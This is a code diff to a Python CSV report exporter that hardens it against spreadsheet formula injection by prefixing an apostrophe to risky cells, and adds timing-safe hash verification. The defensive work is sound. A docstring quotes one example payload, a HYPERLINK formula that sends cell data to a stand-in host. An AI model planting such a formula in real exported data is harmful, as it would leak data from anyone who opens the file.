@@ -9,7 +9,6 @@ explicitly rather than leaving it ambiguous.
 import csv
 import hashlib
 import io
-import os
 from datetime import datetime, timedelta, timezone
 from uuid import UUID
 
@@ -21,28 +20,54 @@ from app.models.access_review import AccessReviewItem
 from app.models.violation import Violation
 
 GST = timezone(timedelta(hours=4))
-REPORTS_DIR = os.environ.get("REPORTS_DIR", "/tmp/traceline_reports")
+
+# Leading characters a spreadsheet treats as the start of a formula rather
+# than text. See _sanitize_cell.
+_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
 
 
 def _to_gst(dt: datetime) -> str:
     return dt.astimezone(GST).strftime("%Y-%m-%d %H:%M:%S GST")
 
 
-def _finalize_csv(buffer: io.StringIO, workspace_id: UUID, prefix: str) -> tuple[str, str]:
-    content = buffer.getvalue().encode("utf-8")
-    content_sha256 = hashlib.sha256(content).hexdigest()
+def _sanitize_cell(value: object) -> object:
+    """Neutralise spreadsheet formula injection in exported evidence.
 
-    os.makedirs(REPORTS_DIR, exist_ok=True)
-    file_name = f"{prefix}_{workspace_id}_{content_sha256[:12]}.csv"
-    file_path = os.path.join(REPORTS_DIR, file_name)
-    with open(file_path, "wb") as f:
-        f.write(content)
+    Almost every field in these reports is attacker-influenceable: actor
+    identifiers, schema/table names and grantee names all come from the
+    *monitored* database, where anyone able to create a role or a table
+    controls the string. Excel and LibreOffice execute a cell beginning
+    with = + - @ as a formula on open, so a role named
+    `=HYPERLINK("http://x/"&A1)` turns the auditor's own act of opening the
+    evidence file into data exfiltration.
 
-    return file_path, content_sha256
+    Prefixing with an apostrophe is the standard mitigation: spreadsheets
+    render it as literal text, and the value is preserved verbatim for any
+    non-spreadsheet consumer that strips it. Applied at the single
+    choke-point every row passes through, so a new column can't forget it.
+    """
+    if not isinstance(value, str) or not value:
+        return value
+    if value.startswith(_FORMULA_PREFIXES):
+        return "'" + value
+    return value
+
+
+def _write_row(writer, row: list) -> None:
+    writer.writerow([_sanitize_cell(cell) for cell in row])
+
+
+def _finalize_csv(buffer: io.StringIO) -> tuple[str, str]:
+    """Returns (content, sha256_hex). The hash is computed over the exact
+    UTF-8 bytes that get stored, so re-verification later compares like
+    with like."""
+    content = buffer.getvalue()
+    content_sha256 = hashlib.sha256(content.encode("utf-8")).hexdigest()
+    return content, content_sha256
 
 
 def generate_report_csv(db: Session, workspace_id: UUID, range_start: datetime, range_end: datetime) -> tuple[str, str]:
-    """Returns (file_path, sha256_hex)."""
+    """Returns (content, sha256_hex)."""
     events = db.scalars(
         select(AccessEvent)
         .where(
@@ -79,7 +104,8 @@ def generate_report_csv(db: Session, workspace_id: UUID, range_start: datetime, 
     )
     for e in events:
         violation = violations_by_event.get(e.id)
-        writer.writerow(
+        _write_row(
+            writer,
             [
                 e.occurred_at.astimezone(timezone.utc).isoformat(),
                 _to_gst(e.occurred_at),
@@ -94,10 +120,10 @@ def generate_report_csv(db: Session, workspace_id: UUID, range_start: datetime, 
                 e.region_source or "",
                 "yes" if violation else "no",
                 violation.reason if violation else "",
-            ]
+            ],
         )
 
-    return _finalize_csv(buffer, workspace_id, f"accesslog_{range_start.date()}_{range_end.date()}")
+    return _finalize_csv(buffer)
 
 
 def generate_access_review_report_csv(db: Session, workspace_id: UUID, cycle_id: UUID) -> tuple[str, str]:
@@ -139,7 +165,8 @@ def generate_access_review_report_csv(db: Session, workspace_id: UUID, cycle_id:
     for item in items:
         owner = users_by_id.get(item.owner_user_id)
         reviewer = users_by_id.get(item.reviewed_by_user_id)
-        writer.writerow(
+        _write_row(
+            writer,
             [
                 f"{item.schema_name_snapshot}.{item.table_name_snapshot}",
                 item.classification_tags_snapshot,
@@ -155,13 +182,17 @@ def generate_access_review_report_csv(db: Session, workspace_id: UUID, cycle_id:
                 reviewer.email if reviewer else "",
                 "yes" if item.reviewer_authorized_snapshot else ("no" if item.reviewer_authorized_snapshot is False else ""),
                 _to_gst(item.reviewed_at) if item.reviewed_at else "",
-            ]
+            ],
         )
 
-    return _finalize_csv(buffer, workspace_id, f"accessreview_{cycle_id}")
+    return _finalize_csv(buffer)
 
 
-def verify_report_integrity(file_path: str, expected_sha256: str) -> bool:
-    with open(file_path, "rb") as f:
-        actual = hashlib.sha256(f.read()).hexdigest()
-    return actual == expected_sha256
+def verify_report_integrity(content: str, expected_sha256: str) -> bool:
+    """Re-hash the stored content and compare against the hash recorded at
+    generation time. Compared with compare_digest: the comparison itself
+    shouldn't leak, via timing, how much of a forged hash was correct."""
+    import hmac
+
+    actual = hashlib.sha256(content.encode("utf-8")).hexdigest()
+    return hmac.compare_digest(actual, expected_sha256)
